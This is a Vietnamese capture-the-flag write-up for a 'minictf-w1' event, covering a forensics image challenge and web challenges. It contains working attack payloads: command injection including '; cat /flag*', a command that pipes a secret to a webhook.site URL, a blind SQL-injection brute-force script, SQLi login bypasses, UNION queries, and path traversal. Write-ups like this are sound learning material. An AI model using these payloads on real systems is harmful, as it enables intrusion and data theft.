### minictf-w1
## Forensics
# Dimension
- Đầu Tiên ta nhận được một fize ảnh có kích thước là 0x0.
- Và tên bài là Dimension nên mình đã nãy ra ý tưởng dùng tool Dimension-brutefocer.
- Tuy nhiên mình cần phải chỉnh lại code của tool một tí.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/84c2f782-9cdb-496b-a2b0-813f812581f0)

- Điều chỉnh lại phạm vị bf và chạy code ta được kết quả sau.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/65e97af0-e736-424f-b4c1-5c35ddd0c4d4)

- Mở file ảnh mới được fix lên thì ta được flag.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/22c7c965-7ed4-4b2a-886e-84731fe40f3e)

## Web Application
# Head1
- Src:
```php
<?php

if (strpos($_SERVER['REQUEST_URI'], '_')) {
    die("no no no");
}

if (isset($_GET['input_data'])) {
    $output = shell_exec("curl --head " . $_POST['input_data']);
    echo $output;
}

show_source(__FILE__);
```
- Nói nôm na là chúng ta sẽ phải gửi một get parameter lên server với tên là ```input_data``` và POST giá trị đó để thực hiện câu lệnh ```curl  --head``` .
- Tuy nhiên, ở dùng if thứ nhất đã chặn mọi url có kí tự ```_``` .
- Vì vậy mình đã quyết định dùng Curl để POST thẳng lên url yêu cầu.
- Về phần fillter thì mình đã thay thế ```_``` bằng kí tự ```%5F``` nó tương đương với dấu nhưng không bị chặn bởi fillter.
- Tiếp theo là câu lệnh shell mà mình sẽ gửi lên để nhận dc flag là ```; cat /flag*```.
- Payload: ```curl -X POST -d 'input_data=; cat /flag*' http://45.122.249.68:20018/\?input%5Fdata\=```.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/fc836655-2539-4aa7-8995-b6bbfd840cb1)

- Flag: ```W1{ez_head1_huh}```

# Head2
- Src:
```php
<?php

if (isset($_GET['input_data'])) {
    $output = shell_exec("curl --head " . $_GET['input_data']);
    // echo $output;
}

show_source(__FILE__);
```
- Phần src của bài này tương tự bài trước thậm chí còn ngắn hơn là không có fillter, và phần dữ liệu được gửi đi sẽ được GET thay vì POST.
- Tới đây ta sẽ dùng webhook để bắt dữ liệu.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/cb52aa03-234d-4340-9065-8ed8f3ba8193)

- Payload: ```curl --request POST \
  --url 'http://45.122.249.68:20019/?input_data=%3B%20echo%20%24FLAG%20%7C%20curl%20-H%20%22Content-Type%3A%20text%2Fplain%22%20-X%20POST%20-d%20%40-%20https%3A%2F%2Fwebhook.site%2Fcd4e9f72-a6bf-4076-ad32-31f29bf180bc'```

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/00f3d243-3964-41a8-b755-fd34ca7315dd)

- Flag: ```W1{webhook_not_so_bad_huh?}```

# Dejavu 

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/b0613390-77e6-44b9-8c12-fd2e845eb5bc)

- Chall này khá giống với chall được dạy ở training nhưng có lẻ đã khác vài chỗ.
- Flag vẫn nằm trong db và có 3 phần.
- Mình sẽ chia bài này ra làm 4 phần để nói, cụ thể là loign, part1, part2, và part3.
- Login:
    + Nếu đọc kĩ src thì bạn sẽ thấy flag nằm ở pass của admin.
    + Và để vào được News.php thì bạn phải là admin.
    + Từ đây chúng ta có 2 hướng giải quyết, một là bf pass của admin để login cũng như là tìm flag, hai là sqli để bypass phần login.
    + Lúc đầu mình đã thử bf cái pass nhưng có vẻ không khả quan ( chắc là có kí tự lạ ).
    + code bf của mình :
  ```py
  import requests
  import string

  alphabet = string.ascii_lowercase + string.ascii_uppercase + \
      string.digits + '{' + '}' + '_' + '.'

  url = "http://45.122.249.68:20017/login.php"
  flag = ""
  pos = 1

  while True:
      for char in range(65, 100000):
          char = chr(char)
          data = {
              "username": f"admin' AND SUBSTRING((SELECT password FROM users WHERE username = 'admin'), {pos}, 1) = '{char}'-- -",
              "password": "abcd"
          }
          r = requests.post(url, data=data)
          if r.url == "http://45.122.249.68:20017/news.php":
              pos += 1
              flag += char
              print("Flag:", flag)
              break
      else:
          continue
  ```
    + Sau khi bf không hiệu quả, mình đã chuyển qua sqli với payload
      
  ```sql
  user: admin
  pass: ' OR Password in (Select Password From users WHERE username='admin') AND ''='
  ```
    + Login xong ta sẽ vào được news.php và tới bước tiếp theo.

     ![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/2cf03007-7a41-4669-ad4e-36fe9e1bea87)

- Part1:
    + Ở news.php, server sẽ nhận một get param tên là name rồi từ đó thực hiện truy vấn.
    + Ta có thể sqli từ đây.
    + Mục tiêu đầu tiên của chúng ta là flag trong phần serect.
    + Payload của mình:
      ```sql
      ?name=hehehehe'union%20select%20null,flag%20from%20secret--%20-name=guest'%20union%20select
      ```
    + Part1: ```W1{par1```
- Part2:
    + Để tìm được part này thì ta phải có được ```information_schema.tables``` rồi từ đó truy vấn ra flag.
    + Payload của mình:
      ```sql
      ?name=hehehehe'%20union%20select%20null,flag_5959595959408498_5959595959408498%20from%20secret_8489498498112318_8489498498112318--%20-name=hehehehe'%20union%20select
      ```
    + Part2: ```_part2```  
- Part3:
    + Đây có lẽ là phần khó nhất chall này và mình tốn kha khá thời gian để làm nó.
    + Như đã nói ở trên, mình đã thực hiện nhiều cách để leak ra được pass của admin nhưng điều không có kết quả.
    + Lúc này mình nhớ tới 2 part trước, mình đã dùng querry để có dc flag, vậy tại sao mình lại không dùng cách tương tự.
    + Câu trả lời nằm ở việc nếu muốn có được flag thì phải tự hiện querry trên bản USER, nhưng src lại không cho phép điều đó.
    + Sau khi thử nhiều cách thì mình đã thử chuyển User sang Hex để đánh lừa fillter.
    + Payload của mình:
      ```sql
        ?name=hehehehe%27%20union%20select%20null,password%20from%20u%26%22\0075\0073\0065\0072\0073%22%20where%20username=%27admin%27--%20-
      ```
    + Flag: ```_part③_ⓓⓔⓙⓐⓥⓤ_福🐳😁}```
- Flag: ```W1{part1_part2_part③_ⓓⓔⓙⓐⓥⓤ_福🐳😁}```

# Simple Stuff 

- Đây là một chall rất hay, tuy nhiên dù mình chưa thể solve nó kịp giờ thì mình vẫn muốn viết đôi chút về nó.
- Đầu tiên đây là một trang web dùng để đọc báo lá cãi =))
- Trang web sẽ dùng get param ```id``` để đi đến các trang báo khác.

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/3067d05b-a132-41c4-b3a1-3e89b65eeac3)

 - Tuy nhiên, một người anh của mình đã nói "ở đâu có include thì ở đó có LFI"
 - Mục tiêu của chúng ta là phải đến được ```admin/index.php```.
 - Cho nên payload của chúng ta sẽ là ```?id = ../../../admin/index.php```

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/92a20e25-3d22-411b-8d95-27c648c4f498)

 - Xong bây giờ nhiệm vụ của chúng ta sẽ là sqli vào đây để nhận session id ( tại vì session id được gen từ flag và user+pass thông qua hàm do_xor)
 - Tới đấy thì chúng ta phải đọc sơ qua hàm do_xor

![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/7aa73990-d920-419f-bfb1-b70d13063f82)

 - Hàm này bắt buộc chúng ta phải gửi username dài hơn key ( ở đây là Flag O ) để tránh trường hợp return Null.
```sql
username=aaaa'+UNION+SELECT+'admiaaaaaa.aaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaan', '21232 £297a57a5a743894a0e4a801fc3&password=admin
```
 - Bây giờ mình sẽ gửi payload lên server để test.

   ![image](https://github.com/TooBunReal/minictf-w1/assets/89735990/e09ebb6c-742a-42a8-a94a-63cca67688c6)
 - Sau khi gửi thành công, session id của chúng ta nhận được là
```
54-80-26-18-80-12-17-13-4-62-18-21-20-7-7-62-22-9-4-15-62-17-20-21-62-21-14-6-4-21-9-4-19-62-8-18-62-18-81-62-2-81-81-13-62-9-4-9-4-9-4-9-4-9-4-9-4-62-9-4-9-4-9-4-9-4-9-4-9-4-28-107-97-97-97-97-97-97-97
```
- Sử dụng kĩ thuật reverse xor ta sẽ có được flag ở session id trên.
- Flag :```W1{s1mple_stuff_when_put_together_is_s0_c00l_hehehehehehe_hehehehehehe}```
  
## ﻿ Hồi Kết
- Các chall lần này khá hay, nó hội tụ rất nhiều kĩ thuật mà một người chơi web cần có. Thật tiếc vì mình đã không thể clear trước khi kết thúc giải. Dù sao mình vẫn mong có cơ hội thử sức với nhiều chall khác và cả minictf binary sắp tới.




